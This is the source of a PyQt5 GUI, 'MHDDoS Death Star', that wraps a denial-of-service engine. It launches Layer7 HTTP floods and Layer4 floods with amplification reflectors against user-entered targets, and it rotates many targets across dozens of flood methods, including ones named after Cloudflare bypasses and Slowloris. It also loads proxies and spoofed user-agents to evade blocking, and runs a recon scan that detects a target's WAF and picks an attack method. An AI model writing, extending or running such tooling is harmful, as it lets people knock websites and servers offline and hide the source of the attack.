#!/usr/bin/env python3
"""MHDDoS GUI — lightweight PyQt5 wrapper around core/engine.py."""

import json
import logging
import random
import sys
import threading
import time
from collections import deque
from pathlib import Path
from typing import Optional
from uuid import uuid4

from PyQt5.QtCore import QTimer, Qt
from PyQt5.QtGui import QFont
from PyQt5.QtWidgets import (
    QApplication,
    QCheckBox,
    QComboBox,
    QFileDialog,
    QFormLayout,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QListWidget,
    QMainWindow,
    QPlainTextEdit,
    QProgressBar,
    QPushButton,
    QSpinBox,
    QTabWidget,
    QVBoxLayout,
    QWidget,
    QGridLayout,
    QTextEdit,
)
from yarl import URL

from core.utils import (
    BYTES_SEND,
    REQUESTS_SENT,
    Counter,
    Methods,
    Tools,
    logger,
    bcolors,
    exit,
)
from core.proxy import load_proxies
from core.engine import Layer4, HttpFlood

# ── Consts ──────────────────────────────────────────────
APP_NAME = "MHDDoS Death Star"
METHODS_L7 = list(Methods.LAYER7_METHODS)
METHODS_L4 = list(Methods.LAYER4_METHODS)


# ── Helpers ─────────────────────────────────────────────
def fmt(n: int) -> str:
    """Format large numbers."""
    if n >= 1_000_000:
        return f"{n / 1e6:.1f}M"
    if n >= 1_000:
        return f"{n / 1e3:.1f}K"
    return str(n)


class StatsDisplay(QWidget):
    """Live stats panel: RPS, total, BW, errors."""

    def __init__(self):
        super().__init__()
        self._last_rps_check = time.time()
        self._last_rps_count = 0
        self._history = deque(maxlen=120)  # 60s@500ms
        layout = QHBoxLayout(self)
        layout.setContentsMargins(8, 4, 8, 4)
        bold = QFont()
        bold.setBold(True)
        self.lbl_rps = QLabel("RPS: 0")
        self.lbl_rps.setFont(bold)
        self.lbl_total = QLabel("Total: 0")
        self.lbl_bw = QLabel("BW: 0 KB/s")
        self.lbl_time = QLabel("⏱ 0:00")
        self.lbl_err = QLabel("Errors: 0")
        self.lbl_status = QLabel("IDLE")
        self.lbl_status.setStyleSheet("color: green; font-weight: bold;")
        for w in (
            self.lbl_rps,
            self.lbl_total,
            self.lbl_bw,
            self.lbl_time,
            self.lbl_err,
            self.lbl_status,
        ):
            layout.addWidget(w)
            w.setStyleSheet("padding: 2px 8px;")
        self._timer = QTimer()
        self._timer.timeout.connect(self._update)
        self._timer.start(500)

    def _update(self):
        now = time.time()
        dt = now - self._last_rps_check
        if dt >= 1:
            delta = int(REQUESTS_SENT) - self._last_rps_count
            rps = delta / dt
            self._history.append((now, rps))
            # 5s moving avg
            recent = [v for t, v in self._history if now - t <= 5]
            avg_rps = sum(recent) / max(len(recent), 1)
            self.lbl_rps.setText(f"RPS: {avg_rps:.0f}")
            self._last_rps_count = int(REQUESTS_SENT)
            self._last_rps_check = now
        self.lbl_total.setText(f"Total: {fmt(int(REQUESTS_SENT))}")
        bw = (int(BYTES_SEND) * 8) / max(now - self._last_rps_check, 1) / 1_000_000
        self.lbl_bw.setText(f"BW: {bw:.1f} Mbps")
        elapsed = int(now - self._start_time) if hasattr(self, "_start_time") else 0
        self.lbl_time.setText(f"⏱ {elapsed // 60}:{elapsed % 60:02d}")

    def set_status(self, text: str, color: str = "green"):
        self.lbl_status.setText(text)
        self.lbl_status.setStyleSheet(f"color: {color}; font-weight: bold;")

    def reset(self):
        self._last_rps_check = time.time()
        self._last_rps_count = 0
        self._history.clear()
        self._start_time = time.time()


class AttackController:
    """Bridge between GUI and core/engine.py."""

    def __init__(self, log_cb):
        self._log = log_cb
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()

    def log(self, msg: str):
        self._log(msg)

    def start_l4(
        self,
        host: str,
        port: int,
        method: str,
        threads: int,
        duration: int,
        rpc: int,
        proxies: list,
        reflectors: list,
    ):
        self._stop.clear()
        eng = Layer4(
            target=(host, port),
            threads=threads,
            duration=duration,
            method=method,
            proxies=proxies,
            rpc=rpc,
            reflectors=reflectors,
        )
        eng._stop = self._stop
        eng.run = lambda: self._run_with_log(eng._worker, duration)
        self._thread = threading.Thread(target=eng.run, daemon=True)
        self._thread.start()

    def start_l7(
        self,
        url: str,
        method: str,
        threads: int,
        duration: int,
        rpc: int,
        proxies: list,
        useragents: list,
    ):
        self._stop.clear()
        target = URL(url if "://" in url else f"https://{url}")
        eng = HttpFlood(
            target=target,
            method=method,
            threads=threads,
            duration=duration,
            rpc=rpc,
            proxies=proxies,
            useragents=useragents,
            stop_event=self._stop,
        )
        self._thread = threading.Thread(target=eng.run, daemon=True)
        self._thread.start()

    def start_combined(
        self,
        urls: list,
        methods: list,
        threads: int,
        duration: int,
        rpc: int,
        proxies: list,
        useragents: list,
    ):
        """Run multiple attacks sequentially with rotation."""
        self._stop.clear()

        def _combined():
            while not self._stop.is_set():
                for url, method in zip(urls, methods):
                    if self._stop.is_set():
                        return
                    target = URL(url if "://" in url else f"https://{url}")
                    eng = HttpFlood(
                        target=target,
                        method=method,
                        threads=threads,
                        duration=duration // max(len(urls), 1),
                        rpc=rpc,
                        proxies=proxies,
                        useragents=useragents,
                        stop_event=self._stop,
                    )
                    self.log(f"[COMBINED] Switched to {method} @ {url}")
                    eng.run()
                    if self._stop.is_set():
                        return

        self._thread = threading.Thread(target=_combined, daemon=True)
        self._thread.start()

    def _run_with_log(self, worker, duration):
        self._stop.wait(duration)
        self._stop.set()

    def stop(self):
        self._stop.set()
        self.log("[STOP] Attack stopped.")

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


class MainWindow(QMainWindow):
    """Main GUI window."""

    def __init__(self):
        super().__init__()
        self._ctrl = AttackController(self._log)
        self._proxies = []
        self._useragents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ]
        self._init_ui()

    def _init_ui(self):
        self.setWindowTitle(APP_NAME)
        self.resize(1100, 750)

        central = QWidget()
        self.setCentralWidget(central)
        vbox = QVBoxLayout(central)

        # ── Stats ──
        self.stats = StatsDisplay()
        vbox.addWidget(self.stats)

        # ── Progress bar ──
        self.progress = QProgressBar()
        self.progress.setMaximum(0)
        self.progress.setVisible(False)
        vbox.addWidget(self.progress)

        # ── Tabs ──
        self.tabs = QTabWidget()
        vbox.addWidget(self.tabs)

        self._build_tab_l7()
        self._build_tab_l4()
        self._build_tab_combined()
        self._build_tab_tools()

        # ── Log ──
        self.log_view = QPlainTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setMaximumBlockCount(2000)
        self.log_view.setFont(QFont("Menlo", 10))
        self.log_view.setStyleSheet("background: #1e1e1e; color: #d4d4d4;")
        vbox.addWidget(self.log_view, stretch=1)

        # ── Bottom bar ──
        h = QHBoxLayout()
        self.btn_start = QPushButton("🚀 START")
        self.btn_start.setStyleSheet(
            "background: #28a745; color: white; font-weight: bold; padding: 8px 24px;"
        )
        self.btn_start.clicked.connect(self._on_start)
        self.btn_stop = QPushButton("⏹ STOP")
        self.btn_stop.setStyleSheet(
            "background: #dc3545; color: white; font-weight: bold; padding: 8px 24px;"
        )
        self.btn_stop.clicked.connect(self._on_stop)
        self.btn_stop.setEnabled(False)
        self.btn_clear = QPushButton("Clear Log")
        self.btn_clear.clicked.connect(lambda: self.log_view.clear())
        h.addWidget(self.btn_start)
        h.addWidget(self.btn_stop)
        h.addWidget(self.btn_clear)
        h.addStretch()
        vbox.addLayout(h)

    def _build_tab_l7(self):
        tab = QWidget()
        form = QFormLayout(tab)

        # Target + Auto Detect button
        h_url = QHBoxLayout()
        self.l7_url = QLineEdit("https://example.com")
        btn_autodetect = QPushButton("🔍 Auto Detect")
        btn_autodetect.setToolTip("Scan target & auto-select best method")
        btn_autodetect.clicked.connect(self._l7_autodetect)
        h_url.addWidget(self.l7_url)
        h_url.addWidget(btn_autodetect)
        form.addRow("Target URL:", h_url)

        # Method
        self.l7_method = QComboBox()
        self.l7_method.addItems(sorted(METHODS_L7))
        self.l7_method.setCurrentText("GET")
        form.addRow("Method:", self.l7_method)

        # WAF info label
        self.l7_waf_label = QLabel("")
        self.l7_waf_label.setStyleSheet("color: #888; font-style: italic;")
        form.addRow(self.l7_waf_label)

        # Threads
        self.l7_threads = QSpinBox()
        self.l7_threads.setRange(1, 10000)
        self.l7_threads.setValue(100)
        form.addRow("Threads:", self.l7_threads)

        # Duration
        self.l7_duration = QSpinBox()
        self.l7_duration.setRange(1, 86400)
        self.l7_duration.setValue(60)
        form.addRow("Duration (s):", self.l7_duration)

        # RPC
        self.l7_rpc = QSpinBox()
        self.l7_rpc.setRange(1, 1000)
        self.l7_rpc.setValue(10)
        form.addRow("RPC:", self.l7_rpc)

        self.tabs.addTab(tab, "Layer7")

    def _build_tab_l4(self):
        tab = QWidget()
        form = QFormLayout(tab)

        self.l4_host = QLineEdit("127.0.0.1")
        form.addRow("Host:", self.l4_host)

        self.l4_port = QSpinBox()
        self.l4_port.setRange(1, 65535)
        self.l4_port.setValue(25565)
        form.addRow("Port:", self.l4_port)

        self.l4_method = QComboBox()
        self.l4_method.addItems(sorted(METHODS_L4))
        self.l4_method.setCurrentText("UDP")
        form.addRow("Method:", self.l4_method)

        self.l4_threads = QSpinBox()
        self.l4_threads.setRange(1, 10000)
        self.l4_threads.setValue(50)
        form.addRow("Threads:", self.l4_threads)

        self.l4_duration = QSpinBox()
        self.l4_duration.setRange(1, 86400)
        self.l4_duration.setValue(60)
        form.addRow("Duration (s):", self.l4_duration)

        self.l4_rpc = QSpinBox()
        self.l4_rpc.setRange(1, 1000)
        self.l4_rpc.setValue(10)
        form.addRow("RPC:", self.l4_rpc)

        # Reflector
        self.l4_reflector = QLineEdit()
        self.l4_reflector.setPlaceholderText("amp_reflectors.txt")
        form.addRow("Reflector file:", self.l4_reflector)

        self.tabs.addTab(tab, "Layer4")

    def _build_tab_combined(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        gb = QGroupBox("Multi-Target Rotation")
        gb_layout = QVBoxLayout(gb)

        # Target input + add button
        h_target = QHBoxLayout()
        self.cb_target_input = QLineEdit()
        self.cb_target_input.setPlaceholderText("https://target.com")
        btn_add_target = QPushButton("+ Add")
        btn_add_target.clicked.connect(self._cb_add_target)
        h_target.addWidget(self.cb_target_input)
        h_target.addWidget(btn_add_target)
        gb_layout.addLayout(h_target)

        self.cb_target_list = QListWidget()
        self.cb_target_list.setAlternatingRowColors(True)
        self.cb_target_list.setMaximumHeight(120)
        gb_layout.addWidget(self.cb_target_list)

        btn_rm_target = QPushButton("Remove Selected")
        btn_rm_target.clicked.connect(
            lambda: (
                self.cb_target_list.takeItem(self.cb_target_list.currentRow())
                if self.cb_target_list.currentRow() >= 0
                else None
            )
        )
        gb_layout.addWidget(btn_rm_target)

        layout.addWidget(gb)

        # Methods checkboxes
        gb_m = QGroupBox("Methods (check to use)")
        gb_m_layout = QVBoxLayout(gb_m)
        self.cb_method_checks = {}
        # only show main/important methods, split into rows
        main_methods = [
            "GET",
            "POST",
            "BYPASS",
            "CFB",
            "DGB",
            "RAPID",
            "STEALTH",
            "MIX",
            "H2",
            "H2_RST",
            "TLS_FLOOD",
            "BOT",
            "TOR",
            "STRESS",
            "DYN",
            "COOKIE",
            "PPS",
            "OVH",
            "KILLER",
            "WORDPRESS",
            "BOMB",
            "DOWNLOADER",
            "APACHE",
            "CFBUAM",
            "HEAD",
            "QUIC",
            "MEGA",
            "ASYNC",
            "SLOWLORIS",
        ]
        for i in range(0, len(main_methods), 5):
            row = QHBoxLayout()
            for m in main_methods[i : i + 5]:
                cb = QCheckBox(m)
                row.addWidget(cb)
                self.cb_method_checks[m] = cb
            gb_m_layout.addLayout(row)
        layout.addWidget(gb_m)

        # Config
        form = QFormLayout()
        self.cb_threads = QSpinBox()
        self.cb_threads.setRange(1, 10000)
        self.cb_threads.setValue(200)
        form.addRow("Threads:", self.cb_threads)

        self.cb_duration = QSpinBox()
        self.cb_duration.setRange(1, 86400)
        self.cb_duration.setValue(120)
        form.addRow("Duration (s):", self.cb_duration)

        self.cb_rpc = QSpinBox()
        self.cb_rpc.setRange(1, 1000)
        self.cb_rpc.setValue(10)
        form.addRow("RPC:", self.cb_rpc)

        layout.addLayout(form)
        layout.addStretch()
        self.tabs.addTab(tab, "Combined")

    def _cb_add_target(self):
        url = self.cb_target_input.text().strip()
        if url:
            self.cb_target_list.addItem(url)
            self.cb_target_input.clear()

    def _build_tab_tools(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        gb_proxy = QGroupBox("Proxy Management")
        pf = QFormLayout(gb_proxy)

        self.proxy_file = QLineEdit()
        self.proxy_file.setPlaceholderText("files/proxies/http.txt")
        pf.addRow("Proxy file:", self.proxy_file)

        self.proxy_type = QComboBox()
        self.proxy_type.addItems(["http", "socks4", "socks5"])
        pf.addRow("Type:", self.proxy_type)

        self.proxy_count = QLabel("Loaded: 0")
        pf.addRow(self.proxy_count)

        hb = QHBoxLayout()
        btn_load = QPushButton("Load Proxies")
        btn_load.clicked.connect(self._load_proxies)
        btn_test = QPushButton("Test Proxies (ping)")
        btn_test.clicked.connect(self._test_proxies)
        hb.addWidget(btn_load)
        hb.addWidget(btn_test)
        pf.addRow(hb)

        # UA file
        self.ua_file = QLineEdit()
        self.ua_file.setPlaceholderText("files/useragent.txt")
        pf.addRow("UA file:", self.ua_file)

        self.ua_count = QLabel("Loaded: 0")
        pf.addRow(self.ua_count)

        btn_ua = QPushButton("Load User-Agents")
        btn_ua.clicked.connect(self._load_useragents)
        pf.addRow(btn_ua)

        layout.addWidget(gb_proxy)

        gb_info = QGroupBox("Recon")
        inf = QFormLayout(gb_info)
        self.recon_url = QLineEdit()
        self.recon_url.setPlaceholderText("https://example.com")
        inf.addRow("URL:", self.recon_url)
        btn_recon = QPushButton("Scan")
        btn_recon.clicked.connect(self._run_recon)
        inf.addRow(btn_recon)
        layout.addWidget(gb_info)

        layout.addStretch()
        self.tabs.addTab(tab, "Tools")

    # ── Actions ──────────────────────────────────────────
    def _on_start(self):
        tab = self.tabs.currentIndex()
        if tab == 0:
            self._start_l7()
        elif tab == 1:
            self._start_l4()
        elif tab == 2:
            self._start_combined()

    def _l7_autodetect(self):
        url = self.l7_url.text().strip()
        if not url:
            self._log("[AUTO] Masukin URL dulu")
            return
        self._log(f"[AUTO] Scanning {url}...")
        try:
            from core.recon import ReconSuite

            res = ReconSuite.scan(url, timeout=10.0)
            waf = res.get("waf", "?")
            methods = res.get("recommended_methods", [])
            self.l7_waf_label.setText(
                f"WAF: {waf}  |  Recomended: {', '.join(methods[:5])}"
            )
            if methods:
                idx = self.l7_method.findText(methods[0])
                if idx >= 0:
                    self.l7_method.setCurrentIndex(idx)
                    self._log(f"[AUTO] Method → {methods[0]}")
            self._log(
                f"[AUTO] Done — IP: {res.get('ip', '?')} | Server: {res.get('server', '?')} | Status: {res.get('status', '?')}"
            )
        except Exception as e:
            self._log(f"[AUTO] Error: {e}")

    def _start_l7(self):
        url = self.l7_url.text().strip()
        if not url:
            self._log("ERROR: Target URL required")
            return
        method = self.l7_method.currentText()
        threads = self.l7_threads.value()
        duration = self.l7_duration.value()
        rpc = self.l7_rpc.value()
        self._set_running(True)
        self.stats.reset()
        self._log(
            f"[START] L7 {method} @ {url} | threads={threads} duration={duration}s rpc={rpc}"
        )
        self._ctrl.start_l7(
            url=url,
            method=method,
            threads=threads,
            duration=duration,
            rpc=rpc,
            proxies=self._proxies,
            useragents=self._useragents,
        )
        self._check_done()

    def _start_l4(self):
        host = self.l4_host.text().strip()
        port = self.l4_port.value()
        method = self.l4_method.currentText()
        threads = self.l4_threads.value()
        duration = self.l4_duration.value()
        rpc = self.l4_rpc.value()
        reflectors = []
        if self.l4_reflector.text():
            path = Path(self.l4_reflector.text())
            if path.exists():
                with open(path) as f:
                    reflectors = [l.strip() for l in f if l.strip()]
        self._set_running(True)
        self.stats.reset()
        self._log(
            f"[START] L4 {method} @ {host}:{port} | threads={threads} duration={duration}s"
        )
        self._ctrl.start_l4(
            host=host,
            port=port,
            method=method,
            threads=threads,
            duration=duration,
            rpc=rpc,
            proxies=self._proxies,
            reflectors=reflectors,
        )
        self._check_done()

    def _start_combined(self):
        targets = [
            self.cb_target_list.item(i).text()
            for i in range(self.cb_target_list.count())
        ]
        methods = [m for m, cb in self.cb_method_checks.items() if cb.isChecked()]
        if not targets or not methods:
            self._log("ERROR: Targets & methods required")
            return
        threads = self.cb_threads.value()
        duration = self.cb_duration.value()
        rpc = self.cb_rpc.value()
        self._set_running(True)
        self.stats.reset()
        self._log(f"[START] Combined: {len(targets)} targets × {len(methods)} methods")
        self._ctrl.start_combined(
            urls=targets,
            methods=methods,
            threads=threads,
            duration=duration,
            rpc=rpc,
            proxies=self._proxies,
            useragents=self._useragents,
        )
        self._check_done()

    def _on_stop(self):
        self._ctrl.stop()
        self._set_running(False)
        self._log("[STOP] User initiated stop")

    def _check_done(self):
        if self._ctrl.is_running():
            QTimer.singleShot(500, self._check_done)
        else:
            self._set_running(False)
            elapsed = self.stats._start_time
            if elapsed:
                elapsed_s = int(time.time() - elapsed)
                total = int(REQUESTS_SENT)
                rps = total / max(elapsed_s, 1)
                self._log(f"[DONE] {fmt(total)} req @ {rps:.0f} rps")

    def _set_running(self, running: bool):
        self.btn_start.setEnabled(not running)
        self.btn_stop.setEnabled(running)
        self.progress.setVisible(running)
        self.stats.set_status(
            "ATTACKING" if running else "IDLE", "red" if running else "green"
        )
        if running:
            self.stats._start_time = time.time()

    def _load_proxies(self):
        path = self.proxy_file.text() or "files/proxies/http.txt"
        ptype = self.proxy_type.currentText()
        count = 0
        if Path(path).exists():
            self._proxies = load_proxies(path, ptype)
            count = len(self._proxies)
        self.proxy_count.setText(f"Loaded: {count}")

    def _test_proxies(self):
        self._log("[PROXY] Testing proxies (placeholder)")

    def _load_useragents(self):
        path = self.ua_file.text() or "files/useragent.txt"
        if Path(path).exists():
            with open(path) as f:
                self._useragents = [l.strip() for l in f if l.strip()]
        self.ua_count.setText(f"Loaded: {len(self._useragents)}")

    def _run_recon(self):
        url = self.recon_url.text().strip()
        if not url:
            self._log("ERROR: Recon URL required")
            return
        self._log(f"[RECON] Scanning {url} ...")
        try:
            from core.recon import ReconSuite

            res = ReconSuite.scan(url)
            self._log(
                f"[RECON] IP: {res['ip']} | WAF: {res['waf']} | Server: {res['server']}"
            )
            self._log(f"[RECON] Status: {res['status']} | Ports: {res['open_ports']}")
            self._log(f"[RECON] Recommended: {res['recommended_methods']}")
        except Exception as e:
            self._log(f"[RECON] Error: {e}")

    def _log(self, msg: str):
        self.log_view.appendPlainText(msg)


def main():
    logger.setLevel(logging.INFO)
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
